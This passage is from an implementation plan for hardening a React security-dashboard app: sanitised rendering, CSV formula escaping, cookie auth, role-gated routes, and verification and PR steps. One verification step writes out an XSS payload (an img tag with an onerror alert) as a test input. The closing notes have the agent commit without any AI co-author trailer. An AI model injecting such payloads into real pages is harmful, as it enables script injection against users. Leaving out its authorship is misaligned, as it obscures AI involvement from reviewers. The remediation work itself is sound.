    if (/[",\n]/.test(s)) s = '"' + s.replace(/"/g, '""') + '"';
    return s;
  };
  const lines = rows.map((r) => headers.map((h) => escapeCell(r[h])).join(","));
  return [headers.join(","), ...lines].join("\n");
}
```

> Note: `isAdmin()` is intentionally removed — authorization is now server-side only. Any import of `isAdmin` must be deleted (handled in Task 5.5).

- [ ] **Step 4: Run test, verify it passes**

Run: `npx vitest run src/utils.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/utils.ts src/utils.test.ts
git commit -m "Fix sanitizeHtml (DOMPurify) and CSV formula-injection in toCsv"
```

### Task 5.2: Types

**Files:** Modify `src/types.ts`.

- [ ] **Step 1: Replace `src/types.ts`**

```ts
export type Severity = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";

export interface SecurityEvent {
  id: string;
  timestamp: string | null;
  severity: Severity | string;
  title: string;
  description: string;
  assetHostname: string;
  assetIp: string | null;
  sourceIp: string | null;
  tags: string[];
  userId: string | null;
  threatFlags: string[];
}

// Public user — never carries a password.
export interface User {
  id: string;
  email: string;
  role: string;
  status: string;
}

export interface CurrentUser {
  id: string;
  email: string;
  role: string;
  status?: string;
}
```

- [ ] **Step 2: Commit**

```bash
git add src/types.ts
git commit -m "Update types: widen severity, nullable fields, threatFlags, password-less User"
```

### Task 5.3: API client

**Files:** Replace `src/api.ts`.

- [ ] **Step 1: Replace `src/api.ts`**

```ts
import type { SecurityEvent, User, CurrentUser } from "./types";

// Same-origin via the Vite dev proxy. credentials:"include" sends the httpOnly cookie.
const BASE = "/api";

async function request<T>(path: string, options: RequestInit = {}): Promise<T> {
  const res = await fetch(`${BASE}${path}`, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers ?? {}) },
  });
  const text = await res.text();
  const data = text ? JSON.parse(text) : null;
  if (!res.ok) {
    throw new Error(data?.error ?? `Request failed (${res.status})`);
  }
  return data as T;
}

export function login(email: string, password: string): Promise<{ user: CurrentUser }> {
  return request("/auth/login", { method: "POST", body: JSON.stringify({ email, password }) });
}

export function logout(): Promise<{ message: string }> {
  return request("/auth/logout", { method: "POST" });
}

export function me(): Promise<CurrentUser> {
  return request("/auth/me");
}

export function getEvents(): Promise<SecurityEvent[]> {
  return request("/events");
}

export function getEvent(id: string): Promise<SecurityEvent> {
  return request(`/events/${id}`);
}

export function getUsers(): Promise<User[]> {
  return request("/users");
}

export function createUser(user: { email: string; password: string; role: string }): Promise<User> {
  return request("/users", { method: "POST", body: JSON.stringify(user) });
}

export function updateUser(id: string, patch: { role?: string; status?: string }): Promise<User> {
  return request(`/users/${id}`, { method: "PATCH", body: JSON.stringify(patch) });
}

export function deleteUser(id: string): Promise<{ message: string }> {
  return request(`/users/${id}`, { method: "DELETE" });
}
```

- [ ] **Step 2: Commit**

```bash
git add src/api.ts
git commit -m "Rewrite API client: cookie auth, no localStorage token, no hardcoded secret"
```

### Task 5.4: Auth context

**Files:** Create `src/auth/AuthContext.tsx`.

- [ ] **Step 1: Implement `src/auth/AuthContext.tsx`**

```tsx
import { createContext, useContext, useEffect, useState, type ReactNode } from "react";
import { me, login as apiLogin, logout as apiLogout } from "../api";
import type { CurrentUser } from "../types";

interface AuthState {
  user: CurrentUser | null;
  loading: boolean;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
}

const AuthContext = createContext<AuthState | undefined>(undefined);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<CurrentUser | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    me()
      .then(setUser)
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);

  async function login(email: string, password: string) {
    const { user } = await apiLogin(email, password);
    setUser(user);
  }

  async function logout() {
    await apiLogout();
    setUser(null);
  }

  return (
    <AuthContext.Provider value={{ user, loading, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth(): AuthState {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used within AuthProvider");
  return ctx;
}
```

- [ ] **Step 2: Commit**

```bash
git add src/auth/AuthContext.tsx
git commit -m "Add auth context backed by /api/auth/me"
```

### Task 5.5: App shell + route guards

**Files:** Modify `src/main.tsx`, `src/App.tsx`.

- [ ] **Step 1: Wrap the app with `AuthProvider` in `src/main.tsx`**

Ensure `main.tsx` wraps `<App/>` with `<AuthProvider>` inside `<BrowserRouter>`:
```tsx
import { StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { BrowserRouter } from "react-router-dom";
import { AuthProvider } from "./auth/AuthContext";
import App from "./App";
import "./App.css";

createRoot(document.getElementById("root")!).render(
  <StrictMode>
    <BrowserRouter>
      <AuthProvider>
        <App />
      </AuthProvider>
    </BrowserRouter>
  </StrictMode>
);
```

- [ ] **Step 2: Replace `src/App.tsx` with guarded routes**

```tsx
import { Routes, Route, Navigate } from "react-router-dom";
import Navbar from "./components/Navbar";
import LoginModal from "./components/LoginModal";
import EventsPage from "./pages/EventsPage";
import UsersPage from "./pages/UsersPage";
import NotFound from "./pages/NotFound";
import { useAuth } from "./auth/AuthContext";

function App() {
  const { user, loading } = useAuth();

  if (loading) return <div className="container">Loading…</div>;

  return (
    <>
      <Navbar />
      <div className="container">
        {!user ? (
          <LoginModal />
        ) : (
          <Routes>
            <Route path="/" element={<Navigate to="/events" replace />} />
            <Route path="/events" element={<EventsPage />} />
            <Route
              path="/users"
              element={user.role === "admin" ? <UsersPage /> : <Navigate to="/events" replace />}
            />
            <Route path="*" element={<NotFound />} />
          </Routes>
        )}
      </div>
    </>
  );
}

export default App;
```

- [ ] **Step 3: Commit**

```bash
git add src/main.tsx src/App.tsx
git commit -m "Add auth provider wiring and server-aware route guards; remove debug auth bypass"
```

### Task 5.6: Login modal (real auth)

**Files:** Replace `src/components/LoginModal.tsx`.

- [ ] **Step 1: Replace `src/components/LoginModal.tsx`**

```tsx
import { useState } from "react";
import { useAuth } from "../auth/AuthContext";

export default function LoginModal() {
  const { login } = useAuth();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setSubmitting(true);
    try {
      await login(email, password);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Login failed");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <div className="modal-backdrop">
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <h2>Sign In</h2>
        <p style={{ color: "#666", marginBottom: 20, fontSize: 14 }}>
          Enter your credentials to access PenguWave
        </p>
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: 12 }}>
            <label>Email</label>
            <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required />
          </div>
          <div style={{ marginBottom: 16 }}>
            <label>Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          {error && <p style={{ color: "red", marginBottom: 12 }}>{error}</p>}
          <button type="submit" className="btn-primary" style={{ width: "100%" }} disabled={submitting}>
            {submitting ? "Signing in…" : "Sign In"}
          </button>
        </form>
      </div>
    </div>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add src/components/LoginModal.tsx
git commit -m "Rewrite login modal: real auth, error handling, no console logging"
```

### Task 5.7: Navbar (show user + logout)

**Files:** Replace `src/components/Navbar.tsx`.

- [ ] **Step 1: Replace `src/components/Navbar.tsx`**

```tsx
import { Link, useLocation } from "react-router-dom";
import { useAuth } from "../auth/AuthContext";

export default function Navbar() {
  const location = useLocation();
  const { user, logout } = useAuth();

  return (
    <nav className="navbar">
      <div className="navbar-brand">
        <Link to="/events" style={{ textDecoration: "none", color: "inherit" }}>
          PenguWave 🐧
        </Link>
      </div>
      <div className="navbar-links">
        <Link to="/events" className={location.pathname.startsWith("/events") ? "active" : ""}>
          Events
        </Link>
        {user?.role === "admin" && (
          <Link to="/users" className={location.pathname === "/users" ? "active" : ""}>
            Users
          </Link>
        )}
        {user && (
          <>
            <span style={{ color: "#666", fontSize: 13 }}>
              {user.email} ({user.role})
            </span>
            <button onClick={logout} className="navbar-login-btn">
              Logout
            </button>
          </>
        )}
      </div>
    </nav>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add src/components/Navbar.tsx
git commit -m "Navbar shows current user and real logout; Users link admin-only"
```

---

## Phase 6 — Events & Users pages on the real API

### Task 6.1: Events page (API data, safe render, CRITICAL color, CSV export, threat badges, states)

**Files:** Replace `src/pages/EventsPage.tsx`.

- [ ] **Step 1: Replace `src/pages/EventsPage.tsx`**

```tsx
import { useEffect, useState } from "react";
import { getEvents } from "../api";
import { sanitizeHtml, toCsv } from "../utils";
import type { SecurityEvent } from "../types";

export default function EventsPage() {
  const [events, setEvents] = useState<SecurityEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [severityFilter, setSeverityFilter] = useState("ALL");
  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(null);

  useEffect(() => {
    getEvents()
      .then(setEvents)
      .catch((e) => setError(e instanceof Error ? e.message : "Failed to load"))
      .finally(() => setLoading(false));
  }, []);

  const filtered = events.filter((e) => {
    const q = search.toLowerCase();
    const matchesSearch =
      (e.title ?? "").toLowerCase().includes(q) ||
      (e.description ?? "").toLowerCase().includes(q) ||
      (e.assetHostname ?? "").toLowerCase().includes(q);
    const matchesSeverity = severityFilter === "ALL" || e.severity === severityFilter;
    return matchesSearch && matchesSeverity;
  });

  const severityColor = (s: string) => {
    if (s === "CRITICAL") return "#8b0000";
    if (s === "HIGH") return "red";
    if (s === "MEDIUM") return "orange";
    if (s === "LOW") return "green";
    return "#666";
  };

  function exportCsv() {
    const csv = toCsv(filtered as unknown as Record<string, unknown>[]);
    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "penguwave_events_export.csv";
    a.click();
    URL.revokeObjectURL(url);
  }

  if (loading) return <div className="page-container"><h1>Security Events</h1><p>Loading…</p></div>;
  if (error) return <div className="page-container"><h1>Security Events</h1><p style={{ color: "red" }}>{error}</p></div>;

  return (
    <div className="page-container">
      <h1>Security Events</h1>

      <div style={{ marginBottom: 16, display: "flex", gap: 12, alignItems: "center" }}>
        <input
          type="text"
          placeholder="Search events..."
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ width: "100%", maxWidth: 400 }}
        />
        <select value={severityFilter} onChange={(e) => setSeverityFilter(e.target.value)} style={{ width: 140 }}>
          <option value="ALL">All Severities</option>
          <option value="CRITICAL">Critical</option>
          <option value="HIGH">High</option>
          <option value="MEDIUM">Medium</option>
          <option value="LOW">Low</option>
        </select>
        <button onClick={exportCsv} style={{ fontSize: 13 }}>Export CSV</button>
      </div>

      {/* Plain text — no HTML injection from the search box. */}
      {search && <p>Showing results for: <strong>{search}</strong> ({filtered.length} events)</p>}

      <table>
        <thead>
          <tr>
            <th>Severity</th>
            <th>Title</th>
            <th>Asset</th>
            <th>Source IP</th>
            <th>Timestamp</th>
            <th>Threats</th>
          </tr>
        </thead>
        <tbody>
          {filtered.map((event) => (
            <tr key={event.id} onClick={() => setSelectedEvent(event)} style={{ cursor: "pointer" }}>
              <td style={{ color: severityColor(event.severity), fontWeight: 600 }}>{event.severity}</td>
              <td>{event.title}</td>
              <td style={{ fontFamily: "monospace", fontSize: 13 }}>{event.assetHostname}</td>
              <td style={{ fontFamily: "monospace", fontSize: 13 }}>{event.sourceIp ?? "—"}</td>
              <td style={{ fontSize: 13 }}>{event.timestamp ? new Date(event.timestamp).toLocaleString() : "—"}</td>
              <td>
                {event.threatFlags?.length > 0 && (
                  <span title={event.threatFlags.join(", ")} style={{ color: "#b00", fontWeight: 600 }}>
                    ⚠ {event.threatFlags.join(", ")}
                  </span>
                )}
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {filtered.length === 0 && <p style={{ color: "#999" }}>No events found.</p>}

      {selectedEvent && (
        <div className="event-detail">
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <h2>{selectedEvent.title}</h2>
            <button onClick={() => setSelectedEvent(null)} style={{ cursor: "pointer" }}>Close</button>
          </div>
          {selectedEvent.threatFlags?.length > 0 && (
            <p style={{ color: "#b00", fontWeight: 600 }}>
              ⚠ This event contains embedded attack payloads: {selectedEvent.threatFlags.join(", ")} (rendered safely)
            </p>
          )}
          <p><strong>Severity:</strong>{" "}
            <span style={{ color: severityColor(selectedEvent.severity) }}>{selectedEvent.severity}</span>
          </p>
          <p><strong>Description:</strong></p>
          {/* Sanitized via DOMPurify before rendering. */}
          <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(selectedEvent.description) }} />
          <p><strong>Asset:</strong> {selectedEvent.assetHostname} ({selectedEvent.assetIp ?? "unknown"})</p>
          <p><strong>Source IP:</strong> {selectedEvent.sourceIp ?? "—"}</p>
          <p><strong>Tags:</strong> {selectedEvent.tags.join(", ")}</p>
          <p><strong>Timestamp:</strong> {selectedEvent.timestamp ? new Date(selectedEvent.timestamp).toLocaleString() : "—"}</p>
          <h3>Raw Event Data</h3>
          <pre>{JSON.stringify(selectedEvent, null, 2)}</pre>
        </div>
      )}
    </div>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add src/pages/EventsPage.tsx
git commit -m "Events page: load from API, safe rendering, CRITICAL color, safe CSV export, threat badges, loading/error/empty states"
```

### Task 6.2: Users page (API CRUD, admin-gated, no passwords)

**Files:** Replace `src/pages/UsersPage.tsx`.

- [ ] **Step 1: Replace `src/pages/UsersPage.tsx`**

```tsx
import { useEffect, useState } from "react";
import { getUsers, createUser, deleteUser } from "../api";
import type { User } from "../types";

export default function UsersPage() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [showForm, setShowForm] = useState(false);
  const [newEmail, setNewEmail] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [newRole, setNewRole] = useState("analyst");

  function refresh() {
    setLoading(true);
    getUsers()
      .then(setUsers)
      .catch((e) => setError(e instanceof Error ? e.message : "Failed to load"))
      .finally(() => setLoading(false));
  }

  useEffect(refresh, []);

  async function handleAddUser(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    try {
      await createUser({ email: newEmail, password: newPassword, role: newRole });
      setNewEmail(""); setNewPassword(""); setNewRole("analyst"); setShowForm(false);
      refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to create user");
    }
  }

  async function handleDelete(id: string) {
    try { await deleteUser(id); refresh(); }
    catch (err) { setError(err instanceof Error ? err.message : "Failed to delete user"); }
  }

  if (loading) return <div className="page-container"><h1>User Management</h1><p>Loading…</p></div>;

  return (
    <div className="page-container">
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
        <h1>User Management</h1>
        <button className="btn-primary" onClick={() => setShowForm(!showForm)}>
          {showForm ? "Cancel" : "Add User"}
        </button>
      </div>

      {error && <p style={{ color: "red" }}>{error}</p>}

      {showForm && (
        <div style={{ border: "1px solid #ddd", padding: 16, marginBottom: 20, background: "#fafafa" }}>
          <h3 style={{ marginBottom: 12 }}>New User</h3>
          <form onSubmit={handleAddUser}>
            <div style={{ marginBottom: 8 }}>
              <label>Email</label>
              <input type="email" value={newEmail} onChange={(e) => setNewEmail(e.target.value)} required />
            </div>
            <div style={{ marginBottom: 8 }}>
              <label>Password</label>
              <input type="password" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} required />
            </div>
            <div style={{ marginBottom: 12 }}>
              <label>Role</label>
              <select value={newRole} onChange={(e) => setNewRole(e.target.value)}>
                <option value="admin">Admin</option>
                <option value="analyst">Analyst</option>
                <option value="viewer">Viewer</option>
              </select>
            </div>
            <button type="submit" className="btn-primary">Create User</button>
          </form>
        </div>
      )}

      <table>
        <thead>
          <tr><th>Email</th><th>Role</th><th>Status</th><th>Actions</th></tr>
        </thead>
        <tbody>
          {users.map((user) => (
            <tr key={user.id}>
              <td>{user.email}</td>
              <td>{user.role}</td>
              <td><span style={{ color: user.status === "active" ? "green" : "#999" }}>{user.status}</span></td>
              <td>
                <button onClick={() => handleDelete(user.id)} style={{ color: "red" }}>Delete</button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {users.length === 0 && <p style={{ color: "#999" }}>No users.</p>}
    </div>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add src/pages/UsersPage.tsx
git commit -m "Users page: API-backed CRUD, no password column, password input type"
```

---

## Phase 7 — End-to-end verification

### Task 7.1: Full type check, lint, and tests

- [ ] **Step 1: Type-check the frontend build**

Run: `npm run build`
Expected: `tsc -b` passes (no type errors), Vite build succeeds.

- [ ] **Step 2: Lint**

Run: `npm run lint`
Expected: no errors (fix any unused imports, e.g. removed `isAdmin`).

- [ ] **Step 3: Run all server tests**

Run: `npm run test:server`
Expected: all PASS (threat, auth, events, users).

- [ ] **Step 4: Run frontend unit tests**

Run: `npx vitest run src/utils.test.ts`
Expected: PASS.

### Task 7.2: Manual end-to-end + exploit-no-longer-fires check

- [ ] **Step 1: Start backend and frontend (two terminals)**

```bash
npm run server:start
# in a second terminal:
npm run dev
```

- [ ] **Step 2: Verify the happy path**

In the browser at `http://localhost:5173`:
- Log in as `admin@penguwave.io` / `admin-demo-pw` → see events.
- Confirm the **Users** link is visible (admin); open it, list loads, **no password column**.
- Log out; log in as `analyst@penguwave.io` / `analyst-demo-pw` → **no Users link**; navigating to `/users` redirects to events.
- Try `viewer@penguwave.io` / `viewer-demo-pw` → login refused (disabled).

- [ ] **Step 3: Confirm the traps are dead**

- Open `evt-052` → description renders as inert text, **no alert fires**.
- Type `<img src=x onerror=alert(1)>` in search → **no alert**, shown as literal text.
- Export CSV, open in a spreadsheet → formula cells are inert (prefixed with `'`).
- In devtools, confirm there is **no token in `localStorage`** and the `pw_session` cookie is `HttpOnly`.
- Confirm `evt-052/053/054` show a **⚠ threat badge**.

- [ ] **Step 4: Confirm persistence**

Stop the backend, restart `npm run server:start`, reload the app — events and any created users are still there (SQLite file persisted).

- [ ] **Step 5: Commit any fixes found during verification**

```bash
git add -A
git commit -m "Fix issues found during end-to-end verification"
```

---

## Phase 8 — Docs, review, PR

### Task 8.1: README

**Files:** Replace `README.md`.

- [ ] **Step 1: Write `README.md`** covering: what was built (Track A), how to run (install, `npm run server:start`, `npm run dev`), the demo credentials, the architecture, the 7 findings + fixes (table), the documented deviations (httpOnly cookie, severity/nullable/threatFlags), the signature feature, and "what I'd do with more time" (rate limiting, CSRF tokens, refresh/expiry, pagination, audit log). Use the spec's Sections 6–9 as the source.

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "Add README: run steps, architecture, security findings and fixes"
```

### Task 8.2: Security review + code review

- [ ] **Step 1:** Invoke `superpowers:requesting-code-review` (and/or the `security-review` skill) over the full diff vs `main`. Address findings.
- [ ] **Step 2:** Re-run `npm run test:server`, `npm run build`, `npm run lint`. All green.
- [ ] **Step 3:** Commit any review fixes.

### Task 8.3: Open and merge the PR

- [ ] **Step 1:** Use `superpowers:finishing-a-development-branch`. Push the branch and open a PR with a clear description (what, why, the findings table, the deviations).

```bash
git push -u origin feat/secure-backend
gh pr create --title "Secure backend for PenguWave (Track A)" --body "<summary, findings table, decisions>"
```

- [ ] **Step 2:** Merge the PR into `main`.

```bash
gh pr merge --merge --delete-branch=false
```

---

## Notes for the implementer

- **Commit as Lotan Tamary, no Claude co-author.** Use the repo's configured identity; do not add `Co-Authored-By` trailers. (Use `git -c user.name="Lotan Tamary" -c user.email="250470649+lotantamary@users.noreply.github.com"` if no global identity is set.)
- **Priority order if time runs short:** Phases 0–4 (the graded secure backend) and Phase 5–6 wiring are must-ship. The threat-badge UI (parts of 6.1) and Phase 8.2 review are next. The signature feature's *detection* (Task 1.1) is cheap and already in the backend; surfacing it in the UI is the only cuttable part.
- **Build order caveat:** `server/app.ts` imports the events and users routers. Implement Tasks 3.3 and 4.1 before running anything that imports `app.ts` (including the Task 3.4 tests).
```
